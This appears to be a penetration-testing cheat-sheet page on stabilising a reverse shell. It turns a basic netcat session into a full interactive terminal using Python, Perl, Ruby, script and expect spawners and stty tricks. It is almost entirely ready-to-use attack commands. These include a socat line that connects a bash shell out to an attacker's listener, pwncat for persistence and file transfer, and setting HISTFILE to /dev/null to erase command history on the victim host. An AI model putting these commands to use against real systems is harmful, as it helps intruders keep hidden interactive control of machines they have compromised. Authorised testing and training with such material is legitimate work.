---
title: Stabilize / Upgrade a Shell
category: reverse-shells
description: From dumb nc shell to full PTY with tab-complete and SIGINT.
tags: [reverse-shell, pty, tty]
os: [linux]
order: 20
---

## Python PTY

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## Background, set local raw, foreground (the full upgrade)

```bash
# In the reverse shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm-256color
# Ctrl-Z to suspend nc on the attacker side
stty raw -echo; fg
# (it'll print garbage; press Enter)
stty rows $(tput lines) cols $(tput cols)   # match your terminal size
```

When done, restore your terminal:

```bash
reset
# or
stty sane
```

## Other PTY spawners

```bash
script -qc /bin/bash /dev/null
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{{LHOST}}:{{LPORT}}
# Above paired with an attacker side:
socat file:`tty`,raw,echo=0 tcp-listen:{{LPORT}}
```

## Skip the dance with pwncat

```bash
pwncat-cs -lp {{LPORT}}        # handles PTY, persistence, file xfer
```

## Useful aliases when you land

```bash
export TERM=xterm-256color SHELL=/bin/bash HISTFILE=/dev/null
alias ll='ls -la'
```

## If `python` isn't there

```bash
# perl
perl -e 'exec "/bin/bash";'
# ruby
ruby -e 'exec "/bin/bash"'
# script
script -qc /bin/bash /dev/null
# expect
expect -c 'spawn /bin/bash; interact'
```
